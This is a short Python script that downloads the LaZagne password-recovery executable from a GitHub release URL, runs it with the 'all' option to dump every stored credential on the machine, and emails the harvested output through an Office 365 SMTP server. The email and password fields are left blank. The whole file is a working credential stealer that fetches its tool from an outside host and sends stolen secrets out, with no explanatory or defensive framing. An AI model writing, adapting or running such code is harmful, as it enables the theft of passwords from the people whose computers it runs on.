import requests
import subprocess
import smtplib

def Download(url):
    GetResponse = requests.get(url)
    filename = url.split("/") [-1]

    with open(filename, "wb") as out_file:
        out_file.write(GetResponse.content)

    print(GetResponse)

def SendMail(email, password, message):

    server = smtplib.SMTP("smtp.office365.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

Download("http://github.com//AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")

result = subprocess.check_output("lazagne.exe all", shell=True);
print(result)

SendMail("", "", result)
